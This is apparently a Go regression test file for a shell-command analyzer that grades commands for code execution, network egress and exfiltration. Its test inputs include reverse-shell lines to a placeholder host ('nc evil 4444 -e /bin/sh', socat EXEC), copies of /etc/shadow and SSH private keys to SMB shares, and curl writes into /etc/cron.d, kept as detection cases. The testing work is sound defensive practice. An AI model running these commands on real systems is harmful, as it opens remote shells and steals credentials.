package analysis

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// ===========================================================================
// Pass 52: the findings a fresh review of the remediated tree reproduced
// ===========================================================================
//
// Each test below pins one finding added by the pass-52 re-review (Findings 80,
// 81 and 82 — Finding 83 lives in cmd/flowsh/main_test.go because it is a
// --batch frame property). They are the regression gate for the class, not for
// one spelling: every row of the class is asserted, so a new spelling that
// reopens it fails here.

// TestFinding080ExecValuedOptionsAreCodeExec pins F80: an option (or a socat
// address) whose value is a command line the tool runs is arbitrary code
// execution — the same effect the knowledge base already declares for
// `sort --compress-program` and git `--exec` — so an execution-denying policy
// denies every spelling, not only the ones whose row happened to say CodeExec.
func TestFinding080ExecValuedOptionsAreCodeExec(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, program string }{
		// rsync's remote shell and remote-side command.
		{`rsync -e "sh -c id" src evil.example:dest`, "sh -c id"},
		{`rsync --rsh="sh -c id" src evil.example:dest`, "sh -c id"},
		{`rsync --rsync-path="sh -c id" src evil.example:dest`, "sh -c id"},
		// tar's remote shell, payload filter and compressor.
		{`tar --rsh-command="sh -c id" -cf host:/tmp/x f`, "sh -c id"},
		{`tar --to-command="sh -c id" -xf a.tar`, "sh -c id"},
		{`tar --use-compress-program="sh -c id" -cf a.tar f`, "sh -c id"},
		{`tar -I "sh -c id" -cf a.tar f`, "sh -c id"},
		// ssh_config's exec-bearing directives, through the same predicate.
		{`ssh -o ProxyCommand="sh -c id" evil.example`, "sh -c id"},
		{`ssh -o LocalCommand="sh -c id" evil.example`, "sh -c id"},
		{`scp -o ProxyCommand="sh -c id" a evil.example:b`, "sh -c id"},
		// netcat-dialect addresses and options.
		{`socat EXEC:/bin/sh tcp-connect:evil:4444`, "/bin/sh"},
		{`nc evil 4444 -e /bin/sh`, "/bin/sh"},
		{`nc -c "/bin/sh" evil 4444`, "/bin/sh"},
		{`ncat evil 4444 -e /bin/sh`, "/bin/sh"},
		{`ncat evil 4444 --exec /bin/sh`, "/bin/sh"},
		// The ssh-program replacement and the remaining exec-valued options.
		{`scp -S /tmp/evil a evil.example:b`, "/tmp/evil"},
		{`sftp -S /tmp/evil evil.example`, "/tmp/evil"},
		{`hg --ssh "sh -c id" clone evil.example:/r`, "sh -c id"},
		{`gcc -wrapper /tmp/evil x.c`, "/tmp/evil"},
		{`nodemon --exec /tmp/evil`, "/tmp/evil"},
		{`cargo-watch -x /tmp/evil`, "/tmp/evil"},
		// Every remaining option whose value the tool executes: the per-file
		// command of find, the post-rotate hook of tcpdump, the interpreter of
		// the Python toolchain, and the program launchers of the shell and of
		// macOS's open.
		{`find . -exec /tmp/evil {} ;`, "/tmp/evil"},
		{`find . -execdir /tmp/evil {} ;`, "/tmp/evil"},
		{`tcpdump -z /tmp/evil -i eth0`, "/tmp/evil"},
		{`virtualenv -p /tmp/evil venv`, "/tmp/evil"},
		{`virtualenv --python /tmp/evil venv`, "/tmp/evil"},
		{`uv --python /tmp/evil run x`, "/tmp/evil"},
		{`uvx --python /tmp/evil x`, "/tmp/evil"},
		{`su -s /tmp/evil root`, "/tmp/evil"},
		{`runuser -s /tmp/evil root`, "/tmp/evil"},
		{`fc -e /tmp/evil`, "/tmp/evil"},
		{`compgen -C /tmp/evil`, "/tmp/evil"},
		{`complete -C /tmp/evil cmd`, "/tmp/evil"},
		{`open -a /tmp/evil`, "/tmp/evil"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindCodeExec, c.program, c.src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, c.src)
	}

	// Kind and grade parity with the spelling the review already accepted: the
	// same operation must not be graded differently by spelling.
	sort := a.Analyze(LangBash, `sort --compress-program=id f`)
	rsync := a.Analyze(LangBash, `rsync -e id src evil.example:dest`)
	if sort.Score.Grade != rsync.Score.Grade {
		t.Errorf("rsync -e graded %s, sort --compress-program graded %s: spelling-dependent severity",
			rsync.Score.Grade, sort.Score.Grade)
	}

	// A non-exec value keeps the effect its own semantics declare: `-o
	// StrictHostKeyChecking=no` is egress, not execution.
	rep := a.Analyze(LangBash, `ssh -o StrictHostKeyChecking=no evil.example`)
	if hasKind(rep, engine.KindCodeExec) || hasKind(rep, engine.KindProcSpawn) {
		t.Errorf("non-exec -o: fabricated an execution: %v", rep.Effects)
	}
	mustEffect(t, rep, engine.KindNetEgress, "evil.example", `ssh -o StrictHostKeyChecking=no evil.example`)
}

// TestFinding081RemoteWriteIsEgress pins F81: a UNC/SMB destination is not a
// local path — writing it sends the bytes to that authority — so the write
// contributes a NetEgress and a credential copied to a share forms an
// exfiltration pair that `Exfiltration: Deny` sees.
func TestFinding081RemoteWriteIsEgress(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, host string }{
		{`cp /etc/shadow //e.test/share/x`, "e.test"},
		{`cp /root/.ssh/id_rsa //e.test/share/x`, "e.test"},
		{`tee //e.test/share/x < /etc/shadow`, "e.test"},
		{`install -m 600 /etc/shadow //e.test/share/x`, "e.test"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindNetEgress, c.host, c.src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: credential copied to a share produced no exfiltration pair (effects=%v)", c.src, rep.Effects)
		}
		if rep.Score.Exfil < engine.DestructCritical {
			t.Errorf("%q: exfil %s, want >= Critical", c.src, rep.Score.Exfil)
		}
	}

	// PowerShell: Move-Item/Copy-Item to a UNC share is the same upload.
	for _, src := range []string{
		`Move-Item C:\Users\a\.ssh\id_rsa \\e.test\share\x`,
		`Copy-Item C:\Users\a\.ssh\id_rsa \\e.test\share\x`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustEffect(t, rep, engine.KindNetEgress, "e.test", src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: credential copied to a share produced no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}

	// A non-credential payload still reports the network write, without a pair.
	rep := a.Analyze(LangBash, `cp /tmp/report.txt //e.test/share/x`)
	mustEffect(t, rep, engine.KindNetEgress, "e.test", `cp /tmp/report.txt //e.test/share/x`)
	if exfilPairs(rep) != 0 {
		t.Errorf("non-secret copy to a share paired: %v", rep.Score.ExfilPairs)
	}

	// Negative controls: a loopback authority is local and must not gain a
	// fabricated network sink. `//tmp/x` is no longer in this list: it is
	// indistinguishable from a single-label UNC authority, so Finding 87
	// models it as an *unresolved* sink (NetEgress over ⊤) instead of guessing
	// it local — the write stays, the authority is never fabricated.
	for _, src := range []string{
		`cp /tmp/a //localhost/share/x`,
		`cp /tmp/a \\\\127.0.0.1\\share\\x`,
	} {
		if rep := a.Analyze(LangBash, src); hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: fabricated NetEgress from a local path: %v", src, rep.Effects)
		}
	}
	for src, authority := range map[string]string{
		`cp /tmp/a //tmp/x`:  "tmp",
		`cp /tmp/a //tmp/y/`: "tmp",
	} {
		rep := a.Analyze(LangBash, src)
		if effectOn(rep, engine.KindNetEgress, authority) {
			t.Errorf("%q: fabricated authority %q (effects=%v)", src, authority, rep.Effects)
		}
		var unresolved bool
		for _, e := range rep.Effects {
			if e.Kind == engine.KindNetEgress && e.Target.IsTop() {
				unresolved = true
			}
		}
		if !unresolved {
			t.Errorf("%q: ambiguous authority produced no unresolved egress (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding082ClientWriteOptions pins F82: every documented curl/wget option
// that writes a caller-named file binds that write, so `curl --libcurl
// /etc/cron.d/x …` and `wget --warc-file=…` are no longer reported as
// network-only.
func TestFinding082ClientWriteOptions(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`curl --libcurl /etc/cron.d/x https://e.test`, "/etc/cron.d/x"},
		{`curl --trace /etc/cron.d/x https://e.test`, "/etc/cron.d/x"},
		{`curl --trace-ascii /etc/cron.d/x https://e.test`, "/etc/cron.d/x"},
		{`curl --stderr /etc/cron.d/x https://e.test`, "/etc/cron.d/x"},
		{`curl --hsts /etc/cron.d/x https://e.test`, "/etc/cron.d/x"},
		{`curl --alt-svc /etc/cron.d/x https://e.test`, "/etc/cron.d/x"},
		{`curl --etag-save /etc/cron.d/x https://e.test`, "/etc/cron.d/x"},
		{`curl --output-dir /etc/cron.d https://e.test`, "/etc/cron.d"},
		{`wget --warc-file=/etc/cron.d/x https://e.test`, "/etc/cron.d/x"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
	}

	// Parity with the declared sibling: the long spelling and the short one
	// carry the same effect set.
	short := a.Analyze(LangBash, `curl -D /tmp/hdr https://e.test`)
	long := a.Analyze(LangBash, `curl --dump-header /tmp/hdr https://e.test`)
	if short.Canonical == nil || long.Canonical == nil || short.Canonical.Key != long.Canonical.Key {
		t.Errorf("curl -D / --dump-header parity lost: %v vs %v", short.Canonical, long.Canonical)
	}
}
